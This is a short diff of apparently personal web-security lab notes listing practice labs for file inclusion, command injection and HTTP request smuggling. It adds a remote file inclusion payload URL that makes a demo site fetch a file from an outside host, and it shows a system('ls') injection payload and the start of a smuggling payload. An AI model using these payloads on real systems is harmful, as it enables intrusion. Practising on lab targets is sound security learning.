@@ -47,11 +47,12 @@ Payload : system("ls")
 
 # Local File Inclusion/ Remote File Inclusion
 Lab: https://bwapp.hakhub.net/rlfi.php
+http://zero.webappsecurity.com:8080/help.html?topic=http://bxss.me/t/fit.txt%3F.html
 
 # Command Injection
 Lab : https://bwapp.hakhub.net/commandi.php
 
-# HTTP Splitting Smuggling
+# HTTP Smuggling
 Lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
 Payload : 
 Content-Length: 35
